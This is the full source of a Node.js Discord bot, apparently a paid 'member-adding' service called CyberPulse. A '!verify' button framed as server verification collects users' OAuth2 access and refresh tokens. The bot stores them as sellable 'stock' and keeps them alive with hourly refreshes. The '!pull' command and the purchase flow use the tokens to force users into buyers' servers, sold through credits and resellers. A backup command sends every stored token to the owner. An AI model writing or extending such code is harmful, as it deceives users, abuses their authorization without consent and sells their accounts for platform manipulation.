const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder, 
  StringSelectMenuOptionBuilder,
  PermissionFlagsBits,
  ChannelType,
  SlashCommandBuilder,
  REST,
  Routes,
  AttachmentBuilder
} = require('discord.js');
const mongoose = require('mongoose');
const axios = require('axios');
require('dotenv').config();

// ==================== CONFIGURATION & ENVIRONMENT ====================
const TOKEN = process.env.DISCORD_TOKEN || process.env.BOT_TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const PUBLIC_URL = process.env.PUBLIC_URL || 'https://oauth1-bb1j.onrender.com';
const MONGO_URI = process.env.MONGO_URI;

// Exclusive Owner ID
const OWNER_ID = '1370594462941581433';
const BANNER_IMAGE_URL = 'https://cdn.discordapp.com/attachments/1531305989410787418/1568198735694139402/Gemini_Generated_Image_xjoeqcxjoeqcxjoe.png?ex=6af19562&is=6af043e2&hm=4298d9d755b0a7b4ffe1b1afa3b14ff15639d997e53a1a0e110589ff341f2da2&';

if (!TOKEN || !CLIENT_ID || !CLIENT_SECRET || !MONGO_URI) {
  console.error("❌ [FATAL ERROR]: Missing critical environment variables in Render settings.");
  process.exit(1);
}

const startTime = Date.now();

// ==================== DATABASE SCHEMAS ====================
mongoose.connect(MONGO_URI)
  .then(() => console.log("⚡ [DATABASE] Connected to database successfully!"))
  .catch(err => console.error("❌ [DATABASE ERROR]:", err));

const userSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  username: String,
  accessToken: { type: String, required: true },
  refreshToken: { type: String, required: true },
  expiresAt: { type: Date, required: true },
  verifiedAt: { type: Date, default: Date.now }
}, { collection: 'verifiedusers' });
const VerifiedUser = mongoose.model('VerifiedUser', userSchema);

const creditSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  balance: { type: Number, default: 0 },
  onlineAdded: { type: Number, default: 0 },
  offlineAdded: { type: Number, default: 0 },
  reactionAdded: { type: Number, default: 0 },
  onlineConsumed: { type: Number, default: 0 },
  offlineConsumed: { type: Number, default: 0 },
  reactionConsumed: { type: Number, default: 0 }
}, { collection: 'usercredits' });
const UserCredit = mongoose.model('UserCredit', creditSchema);

const resellerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'resellers' });
const Reseller = mongoose.model('Reseller', resellerSchema);

const partnerSchema = new mongoose.Schema({
  discordId: { type: String, required: true, unique: true },
  addedAt: { type: Date, default: Date.now }
}, { collection: 'partners' });
const Partner = mongoose.model('Partner', partnerSchema);

const guildConfigSchema = new mongoose.Schema({
  guildId: { type: String, required: true, unique: true },
  verifiedRoleId: { type: String, default: null }
}, { collection: 'guildconfigs' });
const GuildConfig = mongoose.model('GuildConfig', guildConfigSchema);

const operationSchema = new mongoose.Schema({
  opId: { type: String, required: true, unique: true },
  discordId: { type: String, required: true },
  targetGuildId: String,
  requestedQuantity: Number,
  successfulQuantity: { type: Number, default: 0 },
  status: { type: String, default: 'PROCESSING' },
  timestamp: { type: Date, default: Date.now }
}, { collection: 'operations' });
const Operation = mongoose.model('Operation', operationSchema);

const activeSessions = new Map();

// Helper to check administrative/owner privileges
async function hasOwnerPrivileges(userId) {
  if (userId === OWNER_ID) return true;
  const isPartner = await Partner.findOne({ discordId: userId });
  return !!isPartner;
}

// Tiered Pricing & Bulk Discount Calculator Helper
function calculatePrice(quantity) {
  let bonusPercent = 0;
  let tierName = 'Standard Tier 📦';
  
  if (quantity >= 10000) {
    bonusPercent = 15;
    tierName = 'Enterprise Tier 🏢';
  } else if (quantity >= 2500) {
    bonusPercent = 5;
    tierName = 'Pro Tier ⚡';
  } else if (quantity >= 500) {
    tierName = 'Starter Tier 🚀';
  }

  const bonusCredits = Math.floor((quantity * bonusPercent) / 100);
  const totalCreditsGiven = quantity + bonusCredits;

  return { quantity, bonusPercent, tierName, bonusCredits, totalCreditsGiven };
}

// ==================== DISCORD BOT SETUP ====================
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildPresences
  ]
});

// Register Slash Commands
const slashCommands = [
  new SlashCommandBuilder()
    .setName('verifiedrole')
    .setDescription('🛡️ Configure the verified role assigned automatically upon user verification.')
    .addRoleOption(option => 
      option.setName('role')
        .setDescription('Select the verified role')
        .setRequired(true)
    )
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
  console.log(`🤖 [DISCORD BOT] Online and locked in as ${client.user.tag}!`);
  try {
    console.log('🔄 Registering global slash commands...');
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: slashCommands });
    console.log('✅ Slash commands registered successfully.');
  } catch (err) {
    console.error('❌ Failed to register slash commands:', err);
  }
});

// OPTIMIZED BACKGROUND TASK: AUTO-HEALER & PRUNER (Starts 10 mins after boot to prevent Render startup delay)
setTimeout(() => {
  setInterval(async () => {
    try {
      const users = await VerifiedUser.find({});
      for (const user of users) {
        try {
          await axios.get('https://discord.com/api/users/@me', {
            headers: { Authorization: `Bearer ${user.accessToken}` },
            timeout: 3000
          });
        } catch (err) {
          try {
            const res = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
              client_id: CLIENT_ID, client_secret: CLIENT_SECRET, grant_type: 'refresh_token', refresh_token: user.refreshToken
            }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });

            user.accessToken = res.data.access_token;
            user.refreshToken = res.data.refresh_token;
            user.expiresAt = new Date(Date.now() + res.data.expires_in * 1000);
            await user.save();
          } catch (refreshErr) {
            await VerifiedUser.deleteOne({ discordId: user.discordId });
            console.log(`🧹 [AUTO-HEALER] Pruned dead token for user: ${user.username} (${user.discordId})`);
          }
        }
        await new Promise(r => setTimeout(r, 200)); // Throttled to preserve CPU
      }

      // Stock Alert Notification Check
      const currentStock = await VerifiedUser.countDocuments();
      if (currentStock < 500) {
        const ownerUser = await client.users.fetch(OWNER_ID).catch(() => null);
        if (ownerUser) {
          const alertEmbed = new EmbedBuilder()
            .setColor(0xef4444)
            .setTitle('⚠️ CYBERPULSE // LOW STOCK ALERT 📦')
            .setDescription(`Attention Owner: Total verified accounts in database has dropped to **${currentStock}** accounts.`)
            .setTimestamp();
          ownerUser.send({ embeds: [alertEmbed] }).catch(() => {});
        }
      }
    } catch (err) {}
  }, 3600000);
}, 600000); // Delayed startup by 10 minutes

// Global Error Catching
process.on('unhandledRejection', error => console.error('⚠️ Unhandled Rejection:', error));
process.on('uncaughtException', error => console.error('⚠️ Uncaught Exception:', error));

// ==================== DISCORD MESSAGE COMMANDS ====================
client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;

  const prefix = '!';
  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(/ +/);
  const command = args.shift().toLowerCase();

  const isOwner = message.author.id === OWNER_ID;
  const hasPrivileges = await hasOwnerPrivileges(message.author.id);

  try {
    // 1. !verify
    if (command === 'verify') {
      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('⚡ CyberPulse System Clearance & Verification')
        .setDescription('✨ Click the secure button below to complete OAuth2 authorization, claim your verified role, and unlock full server access.')
        .setImage(BANNER_IMAGE_URL)
        .setFooter({ text: 'CyberPulse Security Protocol 🛡️' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder()
          .setLabel('Verify System Clearance')
          .setStyle(ButtonStyle.Link)
          .setURL(`${PUBLIC_URL}/verify`)
          .setEmoji('🔐')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 2. !panel -> OWNER & PARTNERS ONLY
    if (command === 'panel') {
      if (!hasPrivileges) {
        return message.reply('❌ **Access Denied:** Only the bot owner or authorized partners can deploy the master panel.');
      }

      const embed = new EmbedBuilder()
        .setColor(0x7000ff)
        .setTitle('💎 CyberPulse Management & Ticket Hub 🚀')
        .setDescription('🛒 **Buy Credits:** Open a private ticket with administration.\n💳 **My Credits:** Check your available balance.\n⚡ **Add Members:** Initialize deployment sequence.\n\n**📦 Tiered Bulk Pricing Packages:**\n• **Starter:** 500 Credits\n• **Pro (5% Bonus):** 2,500 Credits\n• **Enterprise (15% Bonus):** 10,000 Credits\n\n*Fast, high-quality cybernetic service guaranteed ❤️.*')
        .setImage(BANNER_IMAGE_URL)
        .setFooter({ text: 'CyberPulse Secure Panel v9.0 ⚡' });

      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('btn_buy_credits_ticket').setLabel('Buy Credits').setStyle(ButtonStyle.Success).setEmoji('🛒'),
        new ButtonBuilder().setCustomId('btn_my_credits').setLabel('My Credits').setStyle(ButtonStyle.Secondary).setEmoji('💳'),
        new ButtonBuilder().setCustomId('btn_add_members').setLabel('Add Members').setStyle(ButtonStyle.Primary).setEmoji('⚡'),
        new ButtonBuilder().setLabel('Add Bot').setStyle(ButtonStyle.Link).setURL(`https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&permissions=8&scope=bot`).setEmoji('🤖')
      );

      return message.reply({ embeds: [embed], components: [row] });
    }

    // 3. !calculator <amount>
    if (command === 'calculator' || command === 'calc') {
      const amount = parseInt(args[0], 10);
      if (isNaN(amount) || amount <= 0) {
        return message.reply('⚠️ **Usage:** `!calculator <amount>` (Ex: `!calculator 2500`)');
      }

      const calc = calculatePrice(amount);

      const embed = new EmbedBuilder()
        .setColor(0x38bdf8)
        .setTitle('💳 CyberPulse Tiered Credit Calculator 📊')
        .addFields(
          { name: '📦 Target Order Amount', value: `\`${calc.quantity.toLocaleString()} Credits\``, inline: true },
          { name: '🏆 Pricing Tier', value: `\`${calc.tierName}\``, inline: true },
          { name: '🎁 Bulk Bonus %', value: `\`${calc.bonusPercent}%\``, inline: true },
          { name: '🎉 Extra Bonus Credits', value: `\`+${calc.bonusCredits.toLocaleString()} Credits\``, inline: true },
          { name: '🌟 Total Credits Received', value: `\`${calc.totalCreditsGiven.toLocaleString()} Credits\``, inline: true }
        )
        .setFooter({ text: 'Use !panel or open a ticket to purchase credits!' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 4. !topresellers -> RESELLER LEADERBOARD
    if (command === 'topresellers' || command === 'resellerboard') {
      const topResellers = await UserCredit.find({ offlineConsumed: { $gt: 0 } }).sort({ offlineConsumed: -1 }).limit(5);

      if (topResellers.length === 0) {
        return message.reply('📊 No reseller volume tracked yet.');
      }

      let descriptionText = '🏆 **Top CyberPulse Resellers by Deployment Volume:**\n\n';
      topResellers.forEach((res, index) => {
        const medal = index === 0 ? '👑 🏆' : index === 1 ? '🥈' : index === 2 ? '🥉' : '⭐';
        descriptionText += `${medal} **#${index + 1}** <@${res.discordId}> — **${res.offlineConsumed.toLocaleString()}** Credits Deployed\n`;
      });

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('📊 CyberPulse Reseller Leaderboard 🚀')
        .setDescription(descriptionText)
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 5. !backup -> OWNER ONLY DATABASE SNAPSHOT
    if (command === 'backup') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Owner clearance required.');

      const verifiedUsers = await VerifiedUser.find({});
      const userCredits = await UserCredit.find({});
      const resellers = await Reseller.find({});
      const partners = await Partner.find({});

      const backupData = {
        timestamp: new Date(),
        verifiedUsersCount: verifiedUsers.length,
        verifiedUsers,
        userCredits,
        resellers,
        partners
      };

      const buffer = Buffer.from(JSON.stringify(backupData, null, 2));
      const attachment = new AttachmentBuilder(buffer, { name: `CyberPulse_Backup_${Date.now()}.json` });

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('⚡ CyberPulse Encrypted Database Backup 📦')
        .setDescription('Attached is your snapshot of verified accounts, user balances, and reseller stats.')
        .setTimestamp();

      return message.author.send({ embeds: [embed], files: [attachment] })
        .then(() => message.reply('✅ Encrypted database snapshot sent to your DMs!'))
        .catch(() => message.reply('❌ Failed to DM backup. Check your privacy settings.'));
    }

    // 6. !gc @user <amount>
    if (command === 'gc') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!gc @user <amount>`');

      const calc = calculatePrice(amount);
      const totalToAdd = calc.totalCreditsGiven;

      const totalStock = await VerifiedUser.countDocuments();
      if (totalToAdd > totalStock) {
        return message.reply(`❌ Error: Cannot grant **${totalToAdd}** credits. Stock limit is **${totalStock}**.`);
      }

      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!userCredit) userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });

      userCredit.balance += totalToAdd;
      userCredit.offlineAdded += totalToAdd;
      await userCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0x10b981)
        .setTitle('📦 CyberPulse Credits Issued! 🚀')
        .setDescription(`🖤 **${amount.toLocaleString()}** base credits (+**${calc.bonusCredits.toLocaleString()}** ${calc.tierName} bonus) issued to <@${targetUser.id}>!`)
        .addFields(
          { name: '🌟 New Balance:', value: `\`${userCredit.balance} credits\``, inline: false },
          { name: '📦 Stock Remaining:', value: `\`${totalStock} accounts\``, inline: false }
        )
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 7. !rc @user <amount>
    if (command === 'rc') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('❌ Usage: `!rc @user <amount>`');

      let userCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!userCredit) userCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });

      const deducted = Math.min(userCredit.balance, amount);
      userCredit.balance = Math.max(0, userCredit.balance - amount);
      userCredit.offlineConsumed += deducted;
      await userCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0xef4444)
        .setTitle('🔻 CyberPulse Credits Deducted ⚠️')
        .setDescription(`🖤 **${amount.toLocaleString()}** credits removed from <@${targetUser.id}>'s balance!`)
        .addFields({ name: '🌟 New Balance:', value: `\`${userCredit.balance} credits\``, inline: false })
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 8. Administrative partner & reseller controls
    if (command === 'partner') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Owner clearance required.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!partner @user`');

      await Partner.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`🤝 Successfully appointed <@${targetUser.id}> as a CyberPulse **Partner**! ✨`);
    }

    if (command === 'removepartner') {
      if (!isOwner) return message.reply('❌ **Access Denied:** Owner clearance required.');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!removepartner @user`');

      await Partner.findOneAndDelete({ discordId: targetUser.id });
      return message.reply(`🚫 Revoked partner clearance from <@${targetUser.id}>.`);
    }

    if (command === 'reseller') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!reseller @user`');

      await Reseller.findOneAndUpdate({ discordId: targetUser.id }, { discordId: targetUser.id }, { upsert: true });
      return message.reply(`💼 Successfully registered <@${targetUser.id}> as a CyberPulse **Reseller**! 🌟`);
    }

    if (command === 'removereseller') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetUser = message.mentions.users.first();
      if (!targetUser) return message.reply('⚠️ **Usage:** `!removereseller @user`');

      await Reseller.findOneAndDelete({ discordId: targetUser.id });
      return message.reply(`🚫 Removed <@${targetUser.id}> from reseller registry.`);
    }

    // 9. !resale @user <amount>
    if (command === 'resale') {
      const targetUser = message.mentions.users.first();
      const amount = parseInt(args[1], 10);
      if (!targetUser || isNaN(amount) || amount <= 0) return message.reply('⚠️ **Usage:** `!resale @user <amount>`');

      if (targetUser.id === message.author.id) return message.reply('❌ Cannot transfer credits to yourself!');

      const isReseller = await Reseller.findOne({ discordId: message.author.id });
      if (!isReseller && !hasPrivileges) return message.reply('❌ **Access Denied.**');

      let senderCredit = await UserCredit.findOne({ discordId: message.author.id });
      if (!senderCredit || senderCredit.balance < amount) return message.reply('❌ Insufficient balance.');

      senderCredit.balance -= amount;
      senderCredit.offlineConsumed += amount;
      await senderCredit.save();

      let recipientCredit = await UserCredit.findOne({ discordId: targetUser.id });
      if (!recipientCredit) recipientCredit = new UserCredit({ discordId: targetUser.id, balance: 0 });
      recipientCredit.balance += amount;
      recipientCredit.offlineAdded += amount;
      await recipientCredit.save();

      const embed = new EmbedBuilder()
        .setColor(0x38bdf8)
        .setTitle('💼 CyberPulse Credit Resale Transfer ⚡')
        .setDescription(`✨ Successfully transferred **${amount.toLocaleString()}** credits from <@${message.author.id}> to <@${targetUser.id}>!`)
        .addFields(
          { name: '📤 Sender Remaining Balance', value: `\`${senderCredit.balance} credits\``, inline: true },
          { name: '📥 Recipient Balance', value: `\`${recipientCredit.balance} credits\``, inline: true }
        )
        .setTimestamp();

      return message.reply({ content: `<@${targetUser.id}>`, embeds: [embed] });
    }

    // 10. !irbal / !rbal -> Punisher Reseller Balance Style
    if (command === 'irbal' || command === 'rbal') {
      const targetUser = message.mentions.users.first() || message.author;
      let uc = await UserCredit.findOne({ discordId: targetUser.id }) || { balance: 0, offlineAdded: 0, offlineConsumed: 0 };
      const avatarUrl = targetUser.displayAvatarURL({ dynamic: true, size: 256 }) || BANNER_IMAGE_URL;

      const embed = new EmbedBuilder()
        .setColor(0x2b2d31)
        .setAuthor({ name: `Reseller Balance — ${targetUser.username}`, iconURL: 'https://cdn.discordapp.com/emojis/841261569083815946.webp?size=96' })
        .setDescription(`**Status:** ✅ Active\n\n🟢 **Online Members:** 0\n🔘 **Offline Members:** ${uc.balance.toLocaleString()}\n🎉 **Reaction Members:** 0\n\n──────────────────────────────\n\n📈 **Online Added:** 0\n📈 **Offline Added:** ${uc.offlineAdded.toLocaleString()}\n📈 **Reaction Added:** 0\n📉 **Online Consumed:** 0\n📉 **Offline Consumed:** ${uc.offlineConsumed.toLocaleString()}\n📉 **Reaction Consumed:** 0`)
        .setThumbnail(avatarUrl)
        .setFooter({ text: 'CyberPulse • Reseller' })
        .setTimestamp();

      return message.reply({ embeds: [embed] });
    }

    // 11. !pull <guild_id> [limit]
    if (command === 'pull') {
      if (!hasPrivileges) return message.reply('❌ **Access Denied.**');
      const targetGuildId = args[0];
      if (!targetGuildId) return message.reply('❌ Usage: `!pull <GUILD_ID> [LIMIT]`');

      const pullLimit = args[1] ? parseInt(args[1], 10) : null;
      const statusMsg = await message.reply(`🚀 Synchronizing database tokens into target \`${targetGuildId}\`...`);

      try {
        const targetGuild = await client.guilds.fetch(targetGuildId);
        const verifiedUsers = await VerifiedUser.find({});
        let successfulJoins = 0;

        for (const userRecord of verifiedUsers) {
          if (pullLimit && successfulJoins >= pullLimit) break;
          try {
            const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
            if (member) continue;
            await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
            successfulJoins++;
            await new Promise(r => setTimeout(r, 600));
          } catch (err) {}
        }
        return statusMsg.edit(`✅ Successfully pulled **${successfulJoins}** verified accounts into server.`);
      } catch (err) {
        return statusMsg.edit('❌ Critical error executing manual pull protocol.');
      }
    }

    if (command === 'bal' || command === 'balance') {
      const uc = await UserCredit.findOne({ discordId: message.author.id }) || { balance: 0 };
      return message.reply(`💳 **Your Balance:** \`${uc.balance} credits\``);
    }

    if (command === 'stock') {
      const totalStock = await VerifiedUser.countDocuments();
      return message.reply(`📦 **Total Verified Stock:** \`${totalStock} accounts\``);
    }

  } catch (err) {
    console.error(`❌ Command Error (${command}):`, err);
  }
});

// ==================== DISCORD INTERACTION HANDLING ====================
client.on('interactionCreate', async (interaction) => {
  try {
    if (interaction.isChatInputCommand() && interaction.commandName === 'verifiedrole') {
      const role = interaction.options.getRole('role');
      await GuildConfig.findOneAndUpdate({ guildId: interaction.guild.id }, { verifiedRoleId: role.id }, { upsert: true });
      return interaction.reply({ content: `✅ Verified role configured to ${role}!`, ephemeral: true });
    }

    if (interaction.isButton()) {
      if (interaction.customId === 'btn_buy_credits_ticket') {
        const cleanName = interaction.user.username.toLowerCase().replace(/[^a-z0-9]/g, '');
        const channelName = `ticket-${cleanName}`;
        const existing = interaction.guild.channels.cache.find(c => c.name === channelName);
        if (existing) return interaction.reply({ content: `❌ Active ticket channel exists: ${existing}`, ephemeral: true });

        const channel = await interaction.guild.channels.create({
          name: channelName, type: ChannelType.GuildText,
          permissionOverwrites: [
            { id: interaction.guild.roles.everyone.id, deny: [PermissionFlagsBits.ViewChannel] },
            { id: interaction.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] },
            { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }
          ]
        });

        const ticketEmbed = new EmbedBuilder().setColor(0x7000ff).setTitle('🛒 CyberPulse Credit Purchase Ticket ⚡')
          .setDescription(`Welcome <@${interaction.user.id}>!\nState how many credits you wish to purchase.\n\n**📦 Tier Packages:**\n• Starter: 500 Credits\n• Pro (5% Bonus): 2,500 Credits\n• Enterprise (15% Bonus): 10,000 Credits`);
        await channel.send({ content: `<@${interaction.user.id}> | <@${OWNER_ID}>`, embeds: [ticketEmbed] });
        return interaction.reply({ content: `✅ Ticket created: ${channel}`, ephemeral: true });
      }

      if (interaction.customId === 'btn_my_credits') {
        const uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        return interaction.reply({ content: `💳 **Your Balance:** \`${uc.balance}\` credits`, ephemeral: true });
      }

      if (interaction.customId === 'btn_add_members') {
        const modal = new ModalBuilder().setCustomId('modal_server_id').setTitle('CyberPulse Scan 🚀');
        const input = new TextInputBuilder().setCustomId('input_server_id').setLabel('Server ID').setStyle(TextInputStyle.Short).setRequired(true);
        modal.addComponents(new ActionRowBuilder().addComponents(input));
        return await interaction.showModal(modal);
      }

      if (interaction.customId === 'btn_confirm_purchase') {
        const session = activeSessions.get(interaction.user.id);
        if (!session) return interaction.reply({ content: '❌ Session expired.', ephemeral: true });

        let uc = await UserCredit.findOne({ discordId: interaction.user.id });
        if (!uc || uc.balance < session.quantity) return interaction.update({ content: `❌ Insufficient credit balance.`, embeds: [], components: [] });

        uc.balance -= session.quantity;
        uc.offlineConsumed += session.quantity;
        await uc.save();

        const opId = `DISCORD-OP-${Math.random().toString(36).substring(2, 8).toUpperCase()}`;
        await Operation.create({ opId, discordId: interaction.user.id, targetGuildId: session.serverId, requestedQuantity: session.quantity });

        await interaction.update({ content: `Adding members ⏳\nProgress: 0/${session.quantity}\n🆔 Operation: \`${opId}\``, embeds: [], components: [] });
        executeDiscordDispatch(interaction, opId, interaction.user.id, session.serverId, session.quantity);
      }
    }

    // PRE-FLIGHT AUDIT & SECURITY CHECKS
    if (interaction.isModalSubmit()) {
      if (interaction.customId === 'modal_server_id') {
        const serverId = interaction.fields.getTextInputValue('input_server_id');
        try {
          const targetGuild = await client.guilds.fetch(serverId);
          const botMember = await targetGuild.members.fetch(client.user.id);

          const hasManageRoles = botMember.permissions.has(PermissionFlagsBits.ManageRoles);
          const hasCreateInvite = botMember.permissions.has(PermissionFlagsBits.CreateInstantInvite);

          if (!hasManageRoles || !hasCreateInvite) {
            return interaction.reply({ content: '❌ **Pre-Flight Audit Failed:** Bot lacks Manage Roles or Create Invite permissions in target server.', ephemeral: true });
          }

          const guildOwner = await targetGuild.fetchOwner().catch(() => ({ user: { tag: 'Unknown' } }));

          activeSessions.set(interaction.user.id, { 
            serverId, 
            guildName: targetGuild.name, 
            memberCount: targetGuild.memberCount,
            guildOwnerTag: guildOwner.user ? guildOwner.user.tag : 'Unknown'
          });

          const selectMenu = new StringSelectMenuBuilder().setCustomId('select_token_type').setPlaceholder('Select token type').addOptions(new StringSelectMenuOptionBuilder().setLabel('offline').setValue('offline'));
          return interaction.reply({ content: `✅ Pre-Flight Scan Passed for **${targetGuild.name}**! Select token type:`, components: [new ActionRowBuilder().addComponents(selectMenu)], ephemeral: true });
        } catch (e) {
          return interaction.reply({ content: '❌ **Pre-Flight Scan Failed:** Bot is not in target server or Server ID is invalid.', ephemeral: true });
        }
      }

      if (interaction.customId === 'modal_quantity') {
        const qty = parseInt(interaction.fields.getTextInputValue('input_quantity'), 10);
        const session = activeSessions.get(interaction.user.id);
        if (!session || isNaN(qty) || qty <= 0) return interaction.reply({ content: '❌ Invalid quantity.', ephemeral: true });

        let uc = await UserCredit.findOne({ discordId: interaction.user.id }) || { balance: 0 };
        if (qty > uc.balance) return interaction.reply({ content: `❌ Insufficient balance (${uc.balance} available).`, ephemeral: true });

        session.quantity = qty;
        const estimatedSeconds = Math.ceil(qty * 0.6);

        const confirmEmbed = new EmbedBuilder()
          .setColor(0x10b981)
          .setTitle('🛡️ CyberPulse Operation Pre-Flight Preview')
          .addFields(
            { name: '🏰 Target Server', value: `${session.guildName}\n\`${session.serverId}\``, inline: true },
            { name: '👑 Guild Owner', value: `\`${session.guildOwnerTag}\``, inline: true },
            { name: '👥 Member Count', value: `\`${session.memberCount}\``, inline: true },
            { name: '🔢 Dispatch Count', value: `${qty} Members`, inline: true },
            { name: '⏱️ Est. Completion', value: `~${estimatedSeconds}s`, inline: true },
            { name: '💳 Cost', value: `${qty} Credits`, inline: true },
            { name: '⚡ Security Status', value: '`PASSED (Permissions & Safety Verified)`', inline: false }
          );

        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId('btn_confirm_purchase').setLabel('Confirm & Dispatch').setStyle(ButtonStyle.Success),
          new ButtonBuilder().setCustomId('btn_cancel_purchase').setLabel('Cancel').setStyle(ButtonStyle.Danger)
        );

        return interaction.reply({ embeds: [confirmEmbed], components: [row], ephemeral: true });
      }
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'select_token_type') {
      const modal = new ModalBuilder().setCustomId('modal_quantity').setTitle('Dispatch Quantity');
      const qtyInput = new TextInputBuilder().setCustomId('input_quantity').setLabel('Quantity').setStyle(TextInputStyle.Short).setRequired(true);
      modal.addComponents(new ActionRowBuilder().addComponents(qtyInput));
      return await interaction.showModal(modal);
    }
  } catch (err) {}
});

async function executeDiscordDispatch(interaction, opId, userId, guildId, quantity) {
  try {
    const targetGuild = await client.guilds.fetch(guildId);
    const verifiedUsers = await VerifiedUser.find({});
    let successful = 0;

    for (const userRecord of verifiedUsers) {
      if (successful >= quantity) break;
      try {
        const member = await targetGuild.members.fetch(userRecord.discordId).catch(() => null);
        if (member) continue;

        await targetGuild.members.add(userRecord.discordId, { accessToken: userRecord.accessToken });
        successful++;

        if (successful % 5 === 0 || successful === quantity) {
          await interaction.editReply({ content: `Adding members ⏳\nProgress: ${successful}/${quantity}\n🆔 Operation: \`${opId}\`` }).catch(() => {});
        }
        await new Promise(r => setTimeout(r, 600));
      } catch (err) {}
    }

    await Operation.findOneAndUpdate({ opId }, { successfulQuantity: successful, status: 'COMPLETED' });
    await interaction.editReply({ content: `✅ Successfully added **${successful}** members! Operation ID: \`${opId}\`` }).catch(() => {});
  } catch (err) {
    await Operation.findOneAndUpdate({ opId }, { status: 'FAILED' });
  }
}

client.login(TOKEN);
